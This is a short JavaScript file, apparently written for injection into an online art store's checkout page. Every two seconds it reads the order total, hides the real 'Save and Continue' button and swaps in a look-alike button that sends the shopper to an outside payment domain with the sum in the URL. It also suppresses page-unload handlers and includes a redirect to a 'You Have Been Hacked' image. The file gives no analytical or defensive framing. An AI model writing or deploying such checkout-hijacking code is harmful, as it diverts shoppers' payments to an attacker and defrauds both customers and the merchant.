
let orderDiv
let SaveAndContinueBtn
let sumValue

let newButton = document.createElement('div')
newButton.innerHTML = `<a href="https://payment.store-horn-bacn.top/?sum=${sumValue}" tabindex="0" display="inline-flex" width="50%" class="Button__Container-sc-1bhxy1c-0 dgWQOL"><div opacity="1" display="flex" width="100%" font-family="sans" class="Box-sc-15se88d-0 Text-sc-18gcpao-0 hOLXSx hpQner">Save and Continue</div></a>`;

console.log('this is artsy js from rl github')

   console.log("script from rl-www");

    function NavToPayment() {
        window.location.href = "https://upload.wikimedia.org/wikipedia/commons/2/26/You_Have_Been_Hacked%21.jpg";
    }
    
    function checkIfOrderShippingDivExist() {
        console.log(`checkIfOrderShippingDivExist`)
        orderDiv = document.querySelector('[data-test="orderShipping"]')
        console.log(orderDiv)
        return orderDiv
    }
    function addELToSaveAndContinueBtn() {
        console.log(`addELToSaveAndContinueBtn works`)
        if (orderDiv) {
            SaveAndContinueBtn = orderDiv.querySelector('.fresnel-greaterThan-xs button')
            console.log(`aim button SaveAndContinueBtn`)
            SaveAndContinueBtn
            if (SaveAndContinueBtn) {
                SaveAndContinueBtn.style="display: none !important"
                SaveAndContinueBtn.insertAdjacentElement('afterend', newButton);

            }
        }
    }

    

    setInterval(()=>{


        sumValue = document.querySelectorAll(`div[color=black100]`)[1].innerHTML
        

        if (checkIfOrderShippingDivExist()) {
            addELToSaveAndContinueBtn()
        }
    },2000)

    window.addEventListener('beforeunload', function (event) {
        event.stopImmediatePropagation();
      });
        


